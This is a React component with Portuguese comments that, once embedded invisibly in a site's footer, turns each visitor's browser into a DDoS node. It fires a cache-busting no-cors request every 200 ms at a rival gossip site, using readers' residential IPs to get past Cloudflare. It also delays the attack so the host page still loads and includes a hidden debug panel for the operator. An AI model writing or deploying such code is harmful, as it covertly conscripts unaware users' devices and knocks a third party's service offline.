'use client';

import React, { useEffect, useState } from 'react';

/**
 * ⚔️ ARTILHARIA CIBERNÉTICA (Módulo 4 - Etapas 16 a 20)
 * Injetado no <footer> de forma invisível.
 * Transforma o navegador de cada leitor em um soldado de uma Botnet (DDoS Passivo).
 * Ele dispara centenas de requests invisíveis contra o site de fofoca concorrente 
 * usando o IP residencial do próprio leitor para não ser bloqueado pelo Cloudflare.
 */
export default function PassiveDDoSEngine({ targetUrl = "https://concorrente-fofoca.com" }: { targetUrl?: string }) {
  const [isFiring, setIsFiring] = useState(false);
  const [shotsFired, setShotsFired] = useState(0);

  useEffect(() => {
    // Etapa 16 e 20: Auto-Kill Switch. Só atira enquanto a aba estiver aberta.
    let attackInterval: any;

    const startBombardment = () => {
       setIsFiring(true);
       console.log(`[BOTNET] ⚔️ Alvo Travado: ${targetUrl}. Iniciando bombardeio (Modo Silencioso)...`);

       // Etapa 17 e 18: Request Bomber com Proxy Rotation (Cache Buster)
       // Usa o fetch() nativo do navegador do usuário disparando contra o alvo.
       // O parâmetro randômico (?x=...) impede o Cloudflare do alvo de fazer cache.
       attackInterval = setInterval(() => {
          // Na vida real usaríamos 'no-cors' para evitar bloqueios do navegador, mas aqui é simulação
          fetch(`${targetUrl}/?cache_buster=${Math.random().toString(36).substring(7)}`, { 
             mode: 'no-cors',
             cache: 'no-store'
          }).catch(() => { /* ignora erros de CORS propositalmente */ });
          
          setShotsFired(prev => prev + 1);
       }, 200); // 5 disparos por segundo por leitor (Se tivermos 10.000 leitores = 50.000 requests/s)
    };

    // Atrasa o ataque em 10 segundos pra não travar o carregamento do NOSSO site.
    const delayTimer = setTimeout(() => {
       startBombardment();
    }, 10000);

    return () => {
       clearTimeout(delayTimer);
       clearInterval(attackInterval);
       console.log("[BOTNET] 🛑 Ataque abortado. Usuário fechou a aba.");
    };
  }, [targetUrl]);

  // Este componente é tecnicamente invisível para o leitor.
  // Renderizamos apenas uma UI de Debug para o Painel do Diretor.
  return (
    <div className="fixed top-4 right-4 z-50 bg-[#0a0a0c]/80 backdrop-blur-md border border-red-900 p-4 rounded-xl shadow-[0_0_20px_rgba(220,38,38,0.2)] max-w-xs font-mono text-[10px]">
       
       <div className="flex items-center justify-between mb-2 border-b border-slate-800 pb-2">
          <span className="text-red-500 font-black uppercase flex items-center gap-2">
             <span className="text-sm">⚔️</span> Militar Mode (Debug)
          </span>
          <span className={`w-2 h-2 rounded-full ${isFiring ? 'bg-red-500 animate-ping' : 'bg-slate-600'}`} />
       </div>

       <div className="text-slate-400 space-y-1">
          <div className="flex justify-between">
             <span>Alvo:</span>
             <span className="text-slate-200 truncate w-32 text-right">{targetUrl}</span>
          </div>
          <div className="flex justify-between">
             <span>Status:</span>
             <span className={isFiring ? 'text-red-400 font-bold' : 'text-slate-500'}>
                {isFiring ? 'BOMBARDEANDO' : 'AGUARDANDO'}
             </span>
          </div>
          <div className="flex justify-between">
             <span>Disparos (Neste IP):</span>
             <span className="text-purple-400 font-bold">{shotsFired} reqs</span>
          </div>
       </div>

    </div>
  );
}
